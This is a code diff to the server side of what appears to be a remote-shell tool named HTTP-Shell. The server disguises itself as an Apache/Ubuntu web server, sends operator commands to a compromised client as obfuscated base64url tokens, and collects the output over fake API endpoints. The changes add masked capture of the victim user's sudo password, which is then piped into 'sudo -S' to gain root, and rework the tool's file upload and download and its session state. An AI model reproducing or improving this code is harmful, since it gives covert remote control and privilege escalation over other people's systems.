@@ -7,6 +7,7 @@
 import os
 import shlex
 import base64
+import pwinput
 import readline
 import neotermcolor
 from neotermcolor import colored
@@ -14,8 +15,8 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 
 sudo = False ; root = False
 command = None ; prompt = None
-first_run = True ; noerror = True
 local_path = None ; remote_path = None
+first_run = True ; wait_for_cmd = False
 neotermcolor.readline_always_safe = True
 
 banner = """
@@ -74,8 +75,9 @@ class MyServer(BaseHTTPRequestHandler):
             pass
 
     def do_GET(self):
-        global prompt ; global first_run ; global noerror ; global root
-        global local_path ; global remote_path ; global command ; global sudo
+        global wait_for_cmd ; global root
+        global prompt ; global first_run ; global sudo
+        global local_path ; global remote_path ; global command 
         self.server_version = "Apache/2.4.18"
         self.sys_version = "(Ubuntu)"
         try:
@@ -98,7 +100,8 @@ class MyServer(BaseHTTPRequestHandler):
                     path = prompt.split("!")[-1]
                     cinput = (colored(" [HTTP-Shell] ", "grey", "on_green")) ; cinput += (colored(" ", "green", "on_blue"))
                     cinput += (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip() + " ", "grey", "on_blue"))
-                    
+                    old_user = whoami
+
                     if "\\" in path:
                         slash = "\\"
                     else:
@@ -113,13 +116,17 @@ class MyServer(BaseHTTPRequestHandler):
                     command = input(cinput + "\001\033[0m\002")
                     split_cmd = command.split()
 
-                    if command == "" or command == None:
+                    if command == "" or command == None or not command:
                         print()
-                        continue
                     
                     if command == "exit":
-                        print (colored("[!] Exiting..\n", "red"))
-                        exit(0)
+                        if root:
+                            whoami = old_user
+                            root = False ; command = None
+                            print()
+                        else:
+                            print (colored("[!] Exiting..\n", "red"))
+                            exit(0)
 
                     if command == "kill":
                         command = "exit"
@@ -138,20 +145,24 @@ class MyServer(BaseHTTPRequestHandler):
                                 if not sudo:
                                     old_cmd = ' '.join(args[1:])
                                     print (colored(f"[sudo] write password for {str(whoami).rstrip()} on next command:\n","red"))
-                                    sudo_pass = input(cinput + "\001\033[0m\002")
-                                    command = str("echo " + '"' + sudo_pass + '"' + " | " + "sudo -S " + old_cmd)
-                                    sudo = True
+                                    sudo_pass = pwinput.pwinput(prompt=(cinput + "\001\033[0m\002"))
+                                    command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S " + old_cmd)
+                                    wait_for_cmd = True ; sudo = True
+                                    if "su" in args:
+                                        command = str("printf '" + sudo_pass + "'" + " | " + "sudo -S printf 'HTTPShellNull'")
+                                        root = True
                                 else:
                                     old_cmd = ' '.join(args[1:])
-                                    command = str("echo '\n'" + " | " + "sudo -S " + old_cmd)
-                                if "su" in args:
-                                    root = True
+                                    command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
+                                    if "su" in args:
+                                        command = str("printf 'HTTPShellNull'" + " | " + "sudo -S printf 'HTTPShellNull'")
+                                        root = True
 
                     if "upload" in command.split()[0]:
                         args = shlex.split(command)
                         if len(args) < 3 or len(args) > 3:
                             print(colored("[!] Usage: upload local_file remote_file\n","red"))
-                            noerror = False ; command = None
+                            continue
                         else:
                             local_path = args[1]
                             remote_path = args[2]
@@ -162,7 +173,7 @@ class MyServer(BaseHTTPRequestHandler):
                         args = shlex.split(command)
                         if len(args) < 3 or len(args) > 3:
                             print(colored("[!] Usage: download local_file remote_file\n","red"))
-                            noerror = False ; command = None
+                            continue
 
                         else:
                             remote_path = args[1]
@@ -177,23 +188,19 @@ class MyServer(BaseHTTPRequestHandler):
                         print(colored("    clear/cls: Clear terminal screen","blue"))
                         print(colored("    kill: Kill client connection","blue"))
                         print(colored("    exit: Exit from program\n","blue"))
-                        noerror = False ; command = None
+                        continue
 
                     if command is not None:
                         if root and not "cd" in command:
-                            old_cmd = command
-                            command = str("echo ''" + " | " + "sudo -S " + old_cmd)
+                            if not wait_for_cmd:
+                                old_cmd = command
+                                command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
 
                         first_run = False
-                        noerror = True
                         encoded_command = "Token: "
                         encoded_command += self.encode_reversed_base64url(command)
                         self._set_headers()
                         self.wfile.write(encoded_command.encode("utf-8"))
-
-                        if command == "exit":
-                            print (colored("[!] Exiting..\n", "red"))
-                            exit(0)
                         break
 
             else:
@@ -205,13 +212,13 @@ class MyServer(BaseHTTPRequestHandler):
                 self.wfile.write(itworks_message.encode())
 
         except(AttributeError, UnboundLocalError, BrokenPipeError, ConnectionResetError, IndexError, TypeError):
-            command = "HTTPShellNull"
             pass
 
-        return noerror, first_run, command
+        return first_run, command, wait_for_cmd, sudo, root
 
     def do_POST(self):
-        global prompt ; global first_run ; global noerror
+        global wait_for_cmd ; global root
+        global prompt ; global first_run ; global sudo
         global local_path ; global remote_path ; global command
         self.server_version = "Apache/2.4.18"
         self.sys_version = "(Ubuntu)"
@@ -239,11 +246,15 @@ class MyServer(BaseHTTPRequestHandler):
 
             elif self.path == "/api/debug":
                 if decoded_payload == None:
-                    decoded_payload = "HTTPShellNull"
+                    command = None
+                    print()
+                if "HTTPShellNull" in decoded_payload:
+                    command = None
+                    print()
+                if wait_for_cmd:
+                    wait_for_cmd = False ; sudo = True
                 if not first_run and command is not None:
-                    if decoded_payload == "HTTPShellNull":
-                        print()
-                    elif "[sudo]" in decoded_payload:
+                    if "[sudo]" in decoded_payload:
                         lines = decoded_payload.split("\n")
                         filtered_lines = [line for line in lines if "[sudo]" not in line]
                         decoded_payload = "\n".join(filtered_lines)
@@ -254,15 +265,23 @@ class MyServer(BaseHTTPRequestHandler):
 
             elif self.path == "/api/error":
                 if decoded_payload == None:
-                    decoded_payload = "HTTPShellNull"
-                if noerror and command is not None:
-                    if command == "HTTPShellNull":
-                        pass
-                    elif "[sudo]" in decoded_payload:
-                        lines = decoded_payload.split("\n")
-                        filtered_lines = [line for line in lines if "[sudo]" not in line]
-                        decoded_payload = "\n".join(filtered_lines)
-                        print(colored(decoded_payload.rstrip()+"\n", "red"))
+                    command = None
+                    print()
+                if "HTTPShellNull" in decoded_payload:
+                    command = None
+                    print()
+                if wait_for_cmd:
+                    wait_for_cmd = False ; sudo = False
+                if not first_run and command is not None:
+                    if "[sudo]" in decoded_payload:
+                        if not root:
+                            lines = decoded_payload.split("\n")
+                            filtered_lines = [line for line in lines if "[sudo]" not in line]
+                            decoded_payload = "\n".join(filtered_lines)
+                            print(colored(decoded_payload.rstrip()+"\n", "red"))
+                        else:
+                            print(colored("Sorry, try again.\nsudo: 1 incorrect password attempt\n", "red"))
+                            root = False
                     elif "HTTP-Client.sh" in decoded_payload:
                         decoded_payload = decoded_payload.split(":")[-1]
                         replace_payload = "bash: " + command + ":" + decoded_payload
@@ -317,5 +336,6 @@ if __name__ == "__main__":
                 exit(0)
 
         except KeyboardInterrupt:
-            print (colored("\n[!] Exiting..\n", "red"))
+            print (colored("\n[!] Exiting..", "red"))
+            exit(0)
             break
